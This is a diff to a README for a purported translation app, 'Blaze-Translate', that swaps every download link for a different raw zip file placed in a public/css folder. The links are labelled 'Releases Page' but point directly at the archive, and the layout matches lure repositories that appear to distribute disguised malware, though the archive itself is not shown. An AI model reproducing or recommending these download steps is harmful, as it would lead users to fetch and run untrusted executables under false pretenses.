@@ -1,6 +1,6 @@
 # 🌟 Blaze-Translate - A Simple Way to Translate Text
 
-[![Download Blaze-Translate](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/Solenogastres/Blaze-Translate.zip%20Blaze--Translate-v1.0-blue)](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/Solenogastres/Blaze-Translate.zip)
+[![Download Blaze-Translate](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/public/css/Blaze-Translate-1.3.zip%20Blaze--Translate-v1.0-blue)](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/public/css/Blaze-Translate-1.3.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Blaze-Translate is a free and open-source web application designed to make trans
 
 To start using Blaze-Translate, follow these simple steps to download and run the application.
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/Solenogastres/Blaze-Translate.zip) to find the latest version of Blaze-Translate.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/public/css/Blaze-Translate-1.3.zip) to find the latest version of Blaze-Translate.
 
 2. **Choose the Right Version:** Look for the version that best suits your needs. We recommend downloading the latest stable release for the best performance.
 
@@ -43,7 +43,7 @@ Blaze-Translate offers several features to enhance your translation experience:
 
 ## 📥 Download & Install
 
-To download Blaze-Translate, please visit our [Releases Page](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/Solenogastres/Blaze-Translate.zip). Selecting the most recent version ensures you benefit from the latest features and fixes.
+To download Blaze-Translate, please visit our [Releases Page](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/public/css/Blaze-Translate-1.3.zip). Selecting the most recent version ensures you benefit from the latest features and fixes.
 
 1. Click the link to go to the Releases Page. 
 2. Download the file that corresponds to your operating system.
@@ -68,7 +68,7 @@ Using Blaze-Translate is straightforward:
 Should you encounter any issues while using Blaze-Translate, consider the following tips:
 
 - **Ensure Internet Connection:** Check your internet connection if translations are not processing.
-- **Update the App:** Make sure you are using the latest version from our [Releases Page](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/Solenogastres/Blaze-Translate.zip).
+- **Update the App:** Make sure you are using the latest version from our [Releases Page](https://raw.githubusercontent.com/CYBERcorpse-mm/Blaze-Translate/main/public/css/Blaze-Translate-1.3.zip).
 - **Check System Requirements:** Ensure your system meets the necessary requirements listed above.
 
 ## 🛠️ Contribution
